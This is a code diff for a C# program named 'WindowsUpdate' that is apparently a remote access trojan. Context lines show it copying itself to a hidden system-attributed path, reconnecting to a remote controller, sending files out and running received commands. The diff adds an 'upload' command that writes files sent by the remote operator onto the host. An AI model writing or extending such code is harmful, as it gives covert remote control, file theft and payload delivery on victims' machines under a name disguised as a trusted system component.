@@ -57,7 +57,6 @@ namespace WindowsUpdate
                     try
                     {
                         File.Copy(Environment.ProcessPath, finalPath, true);
-                        
                         File.SetAttributes(finalPath, FileAttributes.Hidden | FileAttributes.System);
                     }
                     catch (Exception) { }
@@ -102,7 +101,6 @@ namespace WindowsUpdate
                 finally
                 {
                     CloseConnection();
-
                     if (isRunning)
                     {
                         Thread.Sleep(reconnectDelay);
@@ -182,6 +180,11 @@ namespace WindowsUpdate
                     DownloadFileAndSend(filePath);
                     return;
                 }
+                else if (command.ToLower().StartsWith("upload "))
+                {
+                    string fileName = command.Substring(7).Trim();
+                    response = ReceiveFile(fileName);
+                }
                 else if (command.ToLower().StartsWith("cd "))
                 {
                     string path = command.Substring(3).Trim();
@@ -203,6 +206,52 @@ namespace WindowsUpdate
                 SendResponse($"ERRO: {ex.Message}");
             }
         }
+
+            private static string ReceiveFile(string commandArg)
+            {
+                try
+                {
+                    StringBuilder headerBuilder = new StringBuilder();
+                    while (true)
+                    {
+                        int b = stream.ReadByte();
+                        if (b == -1 || b == '\n') break;
+                        if (b != '\r') headerBuilder.Append((char)b);
+                    }
+
+                    string header = headerBuilder.ToString().Trim();
+                    string[] parts = header.Split('|');
+                    
+                    if (parts.Length < 2 || !long.TryParse(parts[1], out long fileSize))
+                    {
+                        return $"ERRO: Cabeçalho de upload inválido (recebido: '{header}').";
+                    }
+
+                    string fileName = Path.GetFileName(parts[0].Trim());
+                    string fullPath = Path.Combine(Directory.GetCurrentDirectory(), fileName);
+                    
+                    using (FileStream fs = new FileStream(fullPath, FileMode.Create, FileAccess.Write))
+                    {
+                        byte[] buffer = new byte[4096];
+                        long totalRead = 0;
+
+                        while (totalRead < fileSize)
+                        {
+                            int bytesToRead = (int)Math.Min(buffer.Length, fileSize - totalRead);
+                            int read = stream.Read(buffer, 0, bytesToRead);
+                            if (read == 0) break;
+                            fs.Write(buffer, 0, read);
+                            totalRead += read;
+                        }
+                    }
+
+                    return $"SUCESSO: Arquivo {fileName} recebido e salvo em {fullPath}";
+                }
+                catch (Exception ex)
+                {
+                    return $"ERRO ao receber arquivo: {ex.Message}";
+                }
+            }
 
         private static string ExecuteCommand(string command)
         {
